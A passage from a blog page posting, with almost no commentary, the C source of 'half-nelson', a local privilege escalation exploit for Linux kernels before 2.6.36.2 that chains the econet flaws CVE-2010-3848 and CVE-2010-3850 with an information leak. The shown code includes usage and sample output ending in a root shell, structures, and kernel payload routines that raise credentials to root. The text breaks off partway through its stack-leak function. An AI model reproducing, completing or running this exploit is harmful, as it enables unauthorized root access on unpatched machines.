<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <title>@xjump</title>


  <script type="text/javascript" src="/slideout/1.0.1/slideout.min.js"></script>

  <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">
  <script type="text/javascript" defer src="/katex/0.10.1/katex.min.js" ></script>
  <script type="text/javascript" defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>

  <script type="text/javascript" defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>




  <link rel="stylesheet" href="/site.css">

  <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >





</head>

<body>
  <div class="container">
    <div id="mobile-navbar" class="mobile-navbar">
      <div class="mobile-header-logo">
      <a href="/" class="logo">@xjump</a>
      </div>
      <div class="mobile-navbar-icon icon-out">
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>

    <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
      <ul class="mobile-menu-list">
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me">Home</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">Categories</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">Archive</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">RSS</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">About</a>
        </li>
      
      </ul>
    </nav>

    <header id="header">
      <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
      <nav class="menu">
        <ul>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me">Home </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">Categories </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">Archive </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">RSS </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">About </a></li>
        
        </ul>
      </nav>
    </header>

    <main>
      <div class="content" id="mobile-panel">




<article class="post">

<header class="post__header">
  <h1 class="post__title"><a href="https:&#x2F;&#x2F;xjump.me&#x2F;20130106-local-exploit-cve2010-3848-3850&#x2F;">CVE-2010-3848 &amp; CVE-2010-3850</a></h1>
  <div class="post__meta">
    <span class="post__time">2013-01-06</span>

  </div>
</header>

 <div class="post-content"><p>
  local exploit for Linux kernel < 2.6.36.2 x64
</p>
<span id="continue-reading"></span>
<pre style="background-color:#212121;">
<code class="language-cpp" data-lang="cpp"><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
 * half-nelson.c</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 * Linux Kernel &lt; 2.6.36.2 Econet Privilege Escalation Exploit</span><span style="font-style:italic;color:#4a4a4a;">
 * Jon Oberheide &lt;jon@oberheide.org&gt;</span><span style="font-style:italic;color:#4a4a4a;">
 * http://jon.oberheide.org</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 * Information:</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3848</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   Stack-based buffer overflow in the econet_sendmsg function in</span><span style="font-style:italic;color:#4a4a4a;">
 *   net/econet/af_econet.c in the Linux kernel before 2.6.36.2, when an</span><span style="font-style:italic;color:#4a4a4a;">
 *   econet address is configured, allows local users to gain privileges by</span><span style="font-style:italic;color:#4a4a4a;">
 *   providing a large number of iovec structures.</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3850</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   The ec_dev_ioctl function in net/econet/af_econet.c in the Linux kernel</span><span style="font-style:italic;color:#4a4a4a;">
 *   before 2.6.36.2 does not require the CAP_NET_ADMIN capability, which</span><span style="font-style:italic;color:#4a4a4a;">
 *   allows local users to bypass intended access restrictions and configure</span><span style="font-style:italic;color:#4a4a4a;">
 *   econet addresses via an SIOCSIFADDR ioctl call.</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4073</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   The ipc subsystem in the Linux kernel before 2.6.37-rc1 does not</span><span style="font-style:italic;color:#4a4a4a;">
 *   initialize certain structures, which allows local users to obtain</span><span style="font-style:italic;color:#4a4a4a;">
 *   potentially sensitive information from kernel stack memory.</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 * Usage:</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   $ gcc half-nelson.c -o half-nelson -lrt</span><span style="font-style:italic;color:#4a4a4a;">
 *   $ ./half-nelson</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] looking for symbols...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] resolved symbol commit_creds to 0xffffffff81088ad0</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] resolved symbol prepare_kernel_cred to 0xffffffff81088eb0</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] resolved symbol ia32_sysret to 0xffffffff81046692</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] spawning children to achieve adjacent kstacks...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] found parent kstack at 0xffff88001c6ca000</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] found adjacent children kstacks at 0xffff88000d10a000 and 0xffff88000d10c000</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] lower child spawning a helper...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] lower child calling compat_sys_wait4 on helper...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] helper going to sleep...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] upper child triggering stack overflow...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] helper woke up</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] lower child returned from compat_sys_wait4</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] parent&#39;s restart_block has been clobbered</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] escalating privileges...</span><span style="font-style:italic;color:#4a4a4a;">
 *   [+] launching root shell!</span><span style="font-style:italic;color:#4a4a4a;">
 *   # id</span><span style="font-style:italic;color:#4a4a4a;">
 *   uid=0(root) gid=0(root)</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 * Notes:</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   This exploit leverages three vulnerabilities to escalate privileges.</span><span style="font-style:italic;color:#4a4a4a;">
 *   The primary vulnerability is a kernel stack overflow, not a stack buffer</span><span style="font-style:italic;color:#4a4a4a;">
 *   overflow as the CVE description incorrectly states. I believe this is the</span><span style="font-style:italic;color:#4a4a4a;">
 *   first public exploit for a kernel stack overflow, and it turns out to be</span><span style="font-style:italic;color:#4a4a4a;">
 *   a bit tricky due to some particulars of the econet vulnerability. A full</span><span style="font-style:italic;color:#4a4a4a;">
 *   breakdown of the exploit is forthcoming.</span><span style="font-style:italic;color:#4a4a4a;">
 *</span><span style="font-style:italic;color:#4a4a4a;">
 *   Tested on Ubuntu 10.04 LTS (2.6.32-21-generic).</span><span style="font-style:italic;color:#4a4a4a;">
 */</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdio.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdlib.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdint.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stddef.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">string.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">unistd.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">errno.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">fcntl.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">limits.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">syscall.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">inttypes.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/types.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/socket.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/wait.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/ioctl.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/mman.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/ipc.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/sem.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/stat.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/mman.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/resource.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/syscall.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">netinet/in.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">net/if.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">IOVS       </span><span style="color:#f78c6c;">446</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">NPROC      </span><span style="color:#f78c6c;">1024</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_SIZE  </span><span style="color:#f78c6c;">8192</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_UNINIT  </span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_UPPER   </span><span style="color:#f78c6c;">1</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_LOWER   </span><span style="color:#f78c6c;">2</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_DIE   </span><span style="color:#f78c6c;">3</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_PARENT  </span><span style="color:#f78c6c;">4</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">KSTACK_CLOBBER </span><span style="color:#f78c6c;">5</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">LEAK_BASE    </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">ffff880000000000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">LEAK_TOP     </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">ffff8800c0000000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">LEAK_DEPTH   </span><span style="color:#f78c6c;">500</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">LEAK_OFFSET  </span><span style="color:#f78c6c;">32</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">NR_IPC     </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">75</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">NR_WAIT4     </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">72</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">SEMCTL     </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">3</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#ifndef</span><span style="color:#eeffff;"> PF_ECONET</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">PF_ECONET    </span><span style="color:#f78c6c;">19</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#endif</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">STACK_OFFSET   </span><span style="color:#f78c6c;">6</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">RESTART_OFFSET </span><span style="color:#f78c6c;">40</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct </span><span style="color:#eeffff;">ec_addr </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned char</span><span style="color:#eeffff;"> station</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned char</span><span style="color:#eeffff;"> net</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct </span><span style="color:#eeffff;">sockaddr_ec </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned short</span><span style="color:#eeffff;"> sec_family</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned char</span><span style="color:#eeffff;"> port</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned char</span><span style="color:#eeffff;"> cb</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned char</span><span style="color:#eeffff;"> type</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> ec_addr addr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cookie</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct </span><span style="color:#eeffff;">ipc64_perm </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint32_t</span><span style="color:#eeffff;"> key</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint32_t</span><span style="color:#eeffff;"> uid</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint32_t</span><span style="color:#eeffff;"> gid</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint32_t</span><span style="color:#eeffff;"> cuid</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint32_t</span><span style="color:#eeffff;"> cgid</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint32_t</span><span style="color:#eeffff;"> mode</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint16_t</span><span style="color:#eeffff;"> seq</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#ffcb6b;">uint16_t</span><span style="color:#eeffff;"> __pad2</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> __unused1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> __unused2</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct </span><span style="color:#eeffff;">semid64_ds </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> ipc64_perm sem_perm</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> sem_otime</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> __unused1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> sem_ctime</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> __unused</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> sem_nsems</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> __unused3</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> __unused4</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">union </span><span style="color:#eeffff;">semun </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> val</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> semid_ds </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned short </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">array</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> seminfo </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">__buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct </span><span style="color:#eeffff;">region </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> parent</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">NPROC</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> region </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">typedef int </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">))) (*</span><span style="color:#eeffff;"> _commit_creds</span><span style="color:#89ddff;">)(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cred</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">typedef unsigned long </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">))) (*</span><span style="color:#eeffff;"> _prepare_kernel_cred</span><span style="color:#89ddff;">)(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cred</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
_commit_creds commit_creds</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
_prepare_kernel_cred prepare_kernel_cred</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> ia32_sysret</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">)))</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">kernel_code</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">commit_creds</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">prepare_kernel_cred</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">payload_parent</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">asm </span><span style="color:#c792ea;">volatile </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">mov $kernel_code, %rax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">call *%rax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">payload_child</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">asm </span><span style="color:#c792ea;">volatile </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movq $payload_parent, (%0)</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">jmpq *%1</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">:</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">parent </span><span style="color:#89ddff;">+</span><span style="color:#eeffff;"> RESTART_OFFSET</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">ia32_sysret</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">get_kstack</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> size</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> offset</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">union</span><span style="color:#eeffff;"> semun </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">arg</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> semid_ds dummy</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> semid64_ds </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">leaked</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
